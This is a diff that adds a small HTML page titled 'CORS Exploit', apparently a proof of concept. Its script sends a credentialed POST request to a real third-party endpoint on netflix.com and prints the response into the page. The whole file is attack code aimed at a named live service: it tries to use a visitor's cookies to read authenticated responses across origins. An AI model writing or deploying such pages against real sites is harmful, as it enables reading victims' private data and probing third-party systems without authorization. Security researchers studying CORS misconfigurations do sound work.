@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <h2>CORS Exploit</h2>
+  <script>
+    fetch("https://netflix.com/ichnaea/log", {
+      method: "POST",
+      credentials: "include",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ dummy: "data" })
+    })
+    .then(res => res.text())
+    .then(data => {
+      document.body.innerHTML += `<pre>${data}</pre>`;
+    })
+    .catch(err => {
+      document.body.innerHTML += `<pre>Fetch failed: ${err}</pre>`;
+    });
+  </script>
+</body>
+</html>
